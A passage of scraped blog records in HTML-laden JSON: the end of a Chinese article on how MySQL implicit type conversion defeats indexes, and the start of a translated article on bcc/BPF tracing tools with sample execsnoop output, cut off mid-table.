class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">age</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">telephone</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">status</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">created_at</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">updated_at</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0b94cb3053043085-17\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'111111'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'andytohome@gmail.com'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'111'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'12345678901'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">now</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0042 seconds] -->\r\n<p></p>\n<h4>引子</h4>\n<p>首先我们基于上述数据结构中,我们来看看下面这个执行计划:</p>\n<blockquote><p>explain select * from t_base_user where telephone=12345678901;</p></blockquote>\n<p>执行计划结果:</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/05cc14303bda573f6977d4d18c48c42a.png\"><img class=\"alignnone size-full wp-image-113317\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/05cc14303bda573f6977d4d18c48c42a.png\" alt=\"QQ截图20171214105031\"></a></p>\n<p>细心的童鞋应该已经看出来了,为什么数据结构中已经在telephone字段上新建了idx_telephone索引，而上述语句并没有走索引,而是全表扫描。这是为什么呢？带着这疑问,我们来看看今天的主角——MySQL隐式类型转换</p>\n<h4>什么是隐式类型转换？</h4>\n<p>在MySQL中:</p>\n<blockquote><p>当操作符与不同类型的操作数一起使用时，会发生类型转换以使操作数兼容。则会发生转换隐式</p></blockquote>\n<p>也就是说,MySQL会根据需要自动将数字转换为字符串，将字符串转换数字。看到这个概念之后,是不是有一种茅塞顿开的感觉。哦… 原来在数据结构中telephone字段为字符串(varchar)类型,而我们传的手机号是数字类型。现在我们将SQL修改下:</p>\n<blockquote><p>select * from t_base_user where telephone=’12345678901′;</p></blockquote>\n<p>再看看上述语句的执行计划:</p>\n<blockquote><p>explain select * from t_base_user where telephone=’12345678901′;</p></blockquote>\n<p>结果:</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/70ee38005ac1816b149f228df6287fd2.png\"><img class=\"alignnone size-full wp-image-113318\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/70ee38005ac1816b149f228df6287fd2.png\" alt=\"QQ截图20171214105207\"></a></p>\n<p>从这里看,现在语句已经走索引了。为了加深我们对隐式类型转换的印象,我们再多看看几个隐式类型转换案例:</p>\n<p>案例一: 字符串转换为数字</p>\n<blockquote><p>mysql &gt; SELECT 1+’1′;</p></blockquote>\n<p>结果:</p>\n<blockquote><p>mysql &gt; 2</p></blockquote>\n<p>案例二: 数字转换为字符串</p>\n<blockquote><p>mysql -&gt; SELECT CONCAT(1024,’ andyqian’);</p></blockquote>\n<p>结果:</p>\n<blockquote><p>‘1024,’ andyqian’;</p></blockquote>\n<p>此时CONCAT(字符拼接)函数就将1024进行了隐式类型转换。</p>\n<h4>如何避免隐式类型转换?</h4>\n<p>只有当清楚的知道隐式类型转换的规则，才能从根本上避免产生隐式类型转换。MySQL也在官网描述了进行隐式类型转换的一些规则如下:</p>\n<p>1. 隐式类型转换规则:</p>\n<ul>\n<li>如果一个或两个参数都是NULL，比较的结果是NULL，除了NULL安全的&lt;=&gt;相等比较运算符。对于NULL &lt;=&gt; NULL，结果为true。不需要转换</li>\n<li>如果比较操作中的两个参数都是字符串，则将它们作为字符串进行比较。</li>\n<li>如果两个参数都是整数，则将它们作为整数进行比较。</li>\n<li>如果不与数字进行比较，则将十六进制值视为二进制字符串</li>\n<li>如果其中一个参数是十进制值，则比较取决于另一个参数。 如果另一个参数是十进制或整数值，则将参数与十进制值进行比较，如果另一个参数是浮点值，则将参数与浮点值进行比较</li>\n<li>如果其中一个参数是TIMESTAMP或DATETIME列，另一个参数是常量，则在执行比较之前将常量转换为时间戳。</li>\n<li>在所有其他情况下，参数都是作为浮点数（实数）比较的。</li>\n</ul>\n<p>2. 使用CAST函数显示转换<br>\n我们可以使用CAST显示的将类型进行转换,如下所示:</p>\n<blockquote><p>mysql&gt; SELECT 38.8, CAST(38.8 AS CHAR);</p></blockquote>\n<p>结果:</p>\n<blockquote><p>mysql &gt; 38.8, ‘38.8’</p></blockquote>\n<p>如上述中:</p>\n<blockquote><p>select * from t_base_user where telephone=cast(12345678901 as char);</p></blockquote>\n<p>查看执行计划,我们也可以看出</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/383bbad2ced38d0ca41ae862eaae9165.png\"><img class=\"alignnone size-full wp-image-113319\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/383bbad2ced38d0ca41ae862eaae9165.png\" alt=\"QQ截图20171214105349\"></a></p>\n<p>你看,这个时候也走索引了。</p>\n<p>3. 类型一致<br>\n这里说的类型一致,指的是在写SQL时,参数类型一定要与数据库中的类型一致,避免产生隐式类型转换,就如刚才在文首时,如果多检查,写的SQL的参数类型与数据库中字段类型一致，也就不会不走索引了，你说是不是？</p>\n<h4>小心隐式类型转换</h4>\n<p>这里再重申一次,写SQL时一定要检查参数类型与数据库字段类型一致,(如果参数不一致,也要使用CAST函数显示转换成一致)否则造成隐式类型转换,不走索引,后果简直不堪设想, 在前面<a href=\"http://mp.weixin.qq.com/s?__biz=MzI2NDU3OTg5Nw==&amp;mid=2247483736&amp;idx=1&amp;sn=e3fa0bf61b77c9ca12ee1d295c51313a&amp;scene=21#wechat_redirect\" rel=\"nofollow\">《写会MySQL索引》</a>这篇文章中提到过,不走索引,轻则造成慢查询，重则造成数据库服务器CPU100%。唉,说到这里,不瞒你说，我就吃过不少MySQL隐式类型转换的亏 ! (如慢查询) !</p>\n<h4>小结</h4>\n<p>看到这里,是不是有一种,数据表设计还真不是件容易的事情。需要考虑的因素太多太多了,需要考虑字段类型,索引设计,还有各种约束条件等等。也一定要谨慎谨慎再谨慎！其实换个角度就更容易理解了,大家都知道高楼大厦都是需要一个好的地基的,在数据库表设计中,前期的表结构设计就是这个地基，其重要性可想而知。</p>\n<p>从后续开始,每篇MySQL文章最后,都推荐一个常用且实用的MySQL命令:</p>\n<p>今天的命令是:</p>\n<blockquote><p>show full columns from table_name;</p></blockquote>\n<p>作用: 显示指定表所有列信息</p>\n<p>例如:</p>\n<blockquote><p>show full columns from t_base_user;</p></blockquote>\n<p>返回结果如下图所示:</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/0ae91cc856d3e41ea81248f9f6d7d9af.png\"><img class=\"alignnone size-full wp-image-113320\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/0ae91cc856d3e41ea81248f9f6d7d9af.png\" alt=\"QQ截图20171214105501\"></a></p>\n<p>其中:<br>\nField: 字段名<br>\nType: 该字段类型<br>\nCollation: 描述了如何对查询出来的数据进行比较和排序<br>\nNull: 是否允许为空, NO: 不允许，YES 允许<br>\nKey: 键,例如: 主键(PRI), 唯一键(UNI) 等<br>\nDefault: 该字段默认值 Extra: 附加信息如自增主键上的(auto_increment)<br>\nPrivileges: 权限,有select,update等<br>\nComment: 字段注释</p>\n<p>注意: 通过该命令显示都是建表时的信息,这里着重强调一下,在数据库建表时,在每个字段上, 一定要加注释,加注释，加注释！</p>\n<p><strong>最后:  </strong>大家今天剁手了吗？ 祝大家晚安!</p>\n<p>相关阅读:</p>\n<p><a href=\"http://blog.jobbole.com/113142/\" target=\"_blank\" rel=\"nofollow\">写会MySQL索引</a></p>\n<p><a href=\"http://blog.jobbole.com/112877/\" target=\"_blank\" rel=\"nofollow\">读懂MySQL执行计划</a></p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113315\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113315votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113315\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/10/478116e0d2ac0c766a25a7c5d7252167.jpg"], "title": "7 个使用 bcc/BPF 的性能分析神器", "fav_nums": 0, "url": "http://blog.jobbole.com/113328/", "create_date": "2017/12/14", "url_object_id": "9ccbd4ca89f676b9c838a57a82c8d8ab", "comment_nums": 0, "front_image_path": "full/1f020353984ba3d88d0e0349f7b5decd4ed6dd8a.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/17/11/bccbpf-performance\">Brendan Gregg</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9139-1.html\">Linux中国/张守永</a>   </div><blockquote><p>使用伯克利包过滤器 Berkeley Packet Filter（BPF）编译器集合Compiler Collection（BCC）工具深度探查你的 Linux 代码。</p></blockquote>\n<p>在 Linux 中出现的一种新技术能够为系统管理员和开发者提供大量用于性能分析和故障排除的新工具和仪表盘。它被称为增强的伯克利数据包过滤器 enhanced Berkeley Packet Filter（eBPF，或 BPF），虽然这些改进并不是由伯克利开发的，而且它们不仅仅是处理数据包，更多的是过滤。我将讨论在 Fedora 和 Red Hat Linux 发行版中使用 BPF 的一种方法，并在 Fedora 26 上演示。</p>\n<p>BPF 可以在内核中运行由用户定义的沙盒程序，可以立即添加新的自定义功能。这就像按需给 Linux 系统添加超能力一般。 你可以使用它的例子包括如下：</p>\n<ul>\n<li><strong>高级性能跟踪工具</strong>：对文件系统操作、TCP 事件、用户级事件等的可编程的低开销检测。</li>\n<li><strong>网络性能</strong>： 尽早丢弃数据包以提高对 DDoS 的恢复能力，或者在内核中重定向数据包以提高性能。</li>\n<li><strong>安全监控</strong>： 7×24 小时的自定义检测和记录内核空间与用户空间内的可疑事件。</li>\n</ul>\n<p>在可能的情况下，BPF 程序必须通过一个内核验证机制来保证它们的安全运行，这比写自定义的内核模块更安全。我在此假设大多数人并不编写自己的 BPF 程序，而是使用别人写好的。在 GitHub 上的 <a href=\"https://github.com/iovisor/bcc\">BPF Compiler Collection (bcc)</a> 项目中，我已发布许多开源代码。bcc 为 BPF 开发提供了不同的前端支持，包括 Python 和 Lua，并且是目前最活跃的 BPF 工具项目。</p>\n<h3 id=\"toc_1\">7 个有用的 bcc/BPF 新工具</h3>\n<p>为了了解 bcc/BPF 工具和它们的检测内容，我创建了下面的图表并添加到 bcc 项目中。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/bb63b4b8c3e11401acd3a950aee8b737.png\" alt=\"Linux bcc/BPF 跟踪工具图\"></p>\n<p>这些是命令行界面工具，你可以通过 SSH 使用它们。目前大多数分析，包括我的老板，都是用 GUI 和仪表盘进行的。SSH 是最后的手段。但这些命令行工具仍然是预览 BPF 能力的好方法，即使你最终打算通过一个可用的 GUI 使用它。我已着手向一个开源 GUI 添加 BPF 功能，但那是另一篇文章的主题。现在我想向你分享今天就可以使用的 CLI 工具。</p>\n<h4 id=\"toc_2\">1、 execsnoop</h4>\n<p>从哪儿开始呢？如何查看新的进程。那些会消耗系统资源，但很短暂的进程，它们甚至不会出现在 <code>top(1)</code> 命令或其它工具中的显示之中。这些新进程可以使用 <a href=\"https://github.com/brendangregg/perf-tools/blob/master/execsnoop\">execsnoop</a> 进行检测（或使用行业术语说，可以被追踪traced）。 在追踪时，我将在另一个窗口中通过 SSH 登录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f00090748941866\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/execsnoop\r\nPCOMM            PID    PPID   RET ARGS\r\nsshd             12234  727      0 /usr/sbin/sshd -D -R\r\nunix_chkpwd      12236  12234    0 /usr/sbin/unix_chkpwd root nonull\r\nunix_chkpwd      12237  12234    0 /usr/sbin/unix_chkpwd root chkexpiry\r\nbash             12239  12238    0 /bin/bash\r\nid               12241  12240    0 /usr/bin/id -un\r\nhostname         12243  12242    0 /usr/bin/hostname\r\npkg-config       12245  12244    0 /usr/bin/pkg-config --variable=completionsdir bash-completion\r\ngrepconf.sh      12246  12239    0 /usr/libexec/grepconf.sh -c\r\ngrep             12247  12246    0 /usr/bin/grep -qsi ^COLOR.*none /etc/GREP_COLORS\r\ntty              12249  12248    0 /usr/bin/tty -s\r\ntput             12250  12248    0 /usr/bin/tput colors\r\ndircolors        12252  12251    0 /usr/bin/dircolors --sh /etc/DIR_COLORS\r\ngrep             12253  12239    0 /usr/bin/grep -qi ^COLOR.*none /etc/DIR_COLORS\r\ngrepconf.sh      12254  12239    0 /usr/libexec/grepconf.sh -c\r\ngrep             12255  12254    0 /usr/bin/grep -qsi ^COLOR.*none /etc/GREP_COLORS\r\ngrepconf.sh      12256  12239    0 /usr/libexec/grepconf.sh -c\r\ngrep             12257  12256    0 /usr/bin/grep -qsi ^COLOR.*none /etc/GREP_COLORS\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f00090748941866-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f00090748941866-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/execsnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-2\"><span class=\"crayon-e\">PCOMM            </span><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">PPID   </span><span class=\"crayon-e\">RET </span><span class=\"crayon-e\">ARGS</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-3\"><span class=\"crayon-i\">sshd</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12234</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">727</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sshd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">D</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">R</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-4\"><span class=\"crayon-v\">unix</span><span class=\"crayon-sy\">_</span>chkpwd<span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12236</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12234</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">unix_chkpwd </span><span class=\"crayon-e\">root </span><span class=\"crayon-e\">nonull</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-5\"><span class=\"crayon-v\">unix</span><span class=\"crayon-sy\">_</span>chkpwd<span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12237</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12234</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">unix_chkpwd </span><span class=\"crayon-e\">root </span><span class=\"crayon-e\">chkexpiry</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-6\"><span class=\"crayon-i\">bash</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12238</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">bash</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-7\"><span class=\"crayon-i\">id</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">12241</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12240</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">un</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-8\"><span class=\"crayon-i\">hostname</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">12243</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12242</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">hostname</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-9\"><span class=\"crayon-v\">pkg</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">config</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">12245</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12244</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pkg</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">config</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">variable</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">completionsdir </span><span class=\"crayon-v\">bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">completion</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-10\"><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sh</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12246</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libexec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-11\"><span class=\"crayon-i\">grep</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12247</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12246</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">qsi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">^</span><span class=\"crayon-v\">COLOR</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">none</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">GREP_COLORS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-12\"><span class=\"crayon-i\">tty</span><span class=\"crayon-h\">              </span><span class=\"crayon-cn\">12249</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12248</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tty</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-13\"><span class=\"crayon-i\">tput</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12250</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12248</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">tput </span><span class=\"crayon-e\">colors</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-14\"><span class=\"crayon-i\">dircolors</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">12252</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12251</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dircolors</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">DIR_COLORS</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f00090748941866-15\"><span class=\"crayon-i\">grep</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12253</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">qi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">^</span><span class=\"crayon-v\">COLOR</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">none</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">DIR_COLORS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f00090748941866-16\"><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sh</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12254</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span 